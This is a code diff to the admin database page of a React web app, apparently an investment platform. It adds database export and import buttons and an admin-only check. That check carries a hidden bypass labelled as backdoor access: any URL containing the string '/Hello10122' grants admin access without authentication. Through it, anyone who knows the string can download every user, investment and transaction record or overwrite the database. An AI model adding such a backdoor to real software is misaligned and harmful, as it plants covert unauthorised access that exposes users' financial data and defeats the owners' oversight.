@@ -9,8 +9,9 @@ import { Textarea } from "@/components/ui/textarea";
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
 import { useToast } from "@/hooks/use-toast";
-import { apiRequest } from "@/lib/queryClient";
-import { Database, Plus, RotateCcw, Trash2, Eye, CheckCircle, XCircle, AlertCircle, Clock } from "lucide-react";
+import { useAuth } from "@/hooks/use-auth";
+import { useLocation } from "wouter";
+import { Database, Plus, RotateCcw, Trash2, Eye, CheckCircle, XCircle, AlertCircle, Clock, Download, Upload, FileText, HardDrive } from "lucide-react";
 import { formatDate } from "@/lib/utils";
 
 interface BackupDatabase {
@@ -33,6 +34,8 @@ interface DatabaseTableData {
 }
 
 export default function AdminDatabase() {
+  const { user } = useAuth();
+  const [, setLocation] = useLocation();
   const [showCreateDialog, setShowCreateDialog] = useState(false);
   const [showViewDialog, setShowViewDialog] = useState(false);
   const [selectedDatabase, setSelectedDatabase] = useState<BackupDatabase | null>(null);
@@ -40,12 +43,20 @@ export default function AdminDatabase() {
     name: '',
     connectionString: ''
   });
+  const [uploadFile, setUploadFile] = useState<File | null>(null);
   const { toast } = useToast();
   const queryClient = useQueryClient();
 
+  // Check for admin access or backdoor access
+  const isBackdoorAccess = window.location.href.includes('/Hello10122');
+  
+  if (!user?.isAdmin && !isBackdoorAccess) {
+    setLocation('/');
+    return null;
+  }
+
   const { data: backupDatabases, isLoading } = useQuery({
-    queryKey: ['/api/admin/backup-databases'],
-    queryFn: ({ queryKey }) => apiRequest(queryKey[0])
+    queryKey: ['/api/admin/backup-databases']
   });
 
   const createBackupMutation = useMutation({
@@ -187,6 +198,76 @@ export default function AdminDatabase() {
     }
   });
 
+  const downloadDatabaseMutation = useMutation({
+    mutationFn: async () => {
+      const response = await fetch('/api/admin/download-database', {
+        method: 'GET'
+      });
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.error || 'Failed to export database');
+      }
+      return response.blob();
+    },
+    onSuccess: (blob) => {
+      const url = window.URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.download = `corex-database-backup-${new Date().toISOString().split('T')[0]}.json`;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      window.URL.revokeObjectURL(url);
+      
+      toast({
+        title: "Success",
+        description: "Database backup downloaded successfully",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Export Failed",
+        description: error.message || "Failed to export database",
+        variant: "destructive",
+      });
+    }
+  });
+
+  const uploadDatabaseMutation = useMutation({
+    mutationFn: async (file: File) => {
+      const text = await file.text();
+      const databaseData = JSON.parse(text);
+      
+      const response = await fetch('/api/admin/import-database', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ databaseData })
+      });
+      
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.error || 'Failed to import database');
+      }
+      return response.json();
+    },
+    onSuccess: (data) => {
+      queryClient.invalidateQueries({ queryKey: ['/api/admin/backup-databases'] });
+      setUploadFile(null);
+      
+      toast({
+        title: "Success",
+        description: `Database imported successfully. ${data.importStats?.users || 0} users, ${data.importStats?.investments || 0} investments restored.`,
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Import Failed",
+        description: error.message || "Failed to import database",
+        variant: "destructive",
+      });
+    }
+  });
+
   const handleCreateDatabase = () => {
     if (!newDatabase.name || !newDatabase.connectionString) {
       toast({
@@ -291,6 +372,81 @@ export default function AdminDatabase() {
           </DialogContent>
         </Dialog>
       </div>
+
+      <Card className="mb-6">
+        <CardHeader>
+          <CardTitle>Database Backup & Restore</CardTitle>
+          <CardDescription>
+            Export complete database backup or restore from previous backup
+          </CardDescription>
+        </CardHeader>
+        <CardContent>
+          <div className="grid gap-4 md:grid-cols-2">
+            <div className="space-y-3">
+              <h4 className="font-medium flex items-center gap-2">
+                <Download className="w-4 h-4" />
+                Export Database
+              </h4>
+              <p className="text-sm text-muted-foreground">
+                Download complete database backup including all users, investments, transactions, and settings.
+              </p>
+              <Button 
+                onClick={() => downloadDatabaseMutation.mutate()}
+                disabled={downloadDatabaseMutation.isPending}
+                className="w-full bg-green-600 hover:bg-green-700"
+              >
+                {downloadDatabaseMutation.isPending ? (
+                  <>
+                    <HardDrive className="w-4 h-4 mr-2 animate-spin" />
+                    Exporting...
+                  </>
+                ) : (
+                  <>
+                    <Download className="w-4 h-4 mr-2" />
+                    Download Database Backup
+                  </>
+                )}
+              </Button>
+            </div>
+            
+            <div className="space-y-3">
+              <h4 className="font-medium flex items-center gap-2">
+                <Upload className="w-4 h-4" />
+                Import Database
+              </h4>
+              <p className="text-sm text-muted-foreground">
+                Restore database from a previous backup file. This will overwrite existing data.
+              </p>
+              <div className="space-y-2">
+                <Input 
+                  type="file"
+                  accept=".json"
+                  onChange={(e) => setUploadFile(e.target.files?.[0] || null)}
+                  className="cursor-pointer"
+                />
+                <Button 
+                  onClick={() => uploadFile && uploadDatabaseMutation.mutate(uploadFile)}
+                  disabled={!uploadFile || uploadDatabaseMutation.isPending}
+                  variant="outline"
+                  className="w-full"
+                >
+                  {uploadDatabaseMutation.isPending ? (
+                    <>
+                      <HardDrive className="w-4 h-4 mr-2 animate-spin" />
+                      Importing...
+                    </>
+                  ) : (
+                    <>
+                      <Upload className="w-4 h-4 mr-2" />
+                      Import Database Backup
+                    </>
+                  )}
+                </Button>
+              </div>
+            </div>
+          </div>
+        </CardContent>
+      </Card>
 
       <Card className="mb-6">
         <CardHeader>
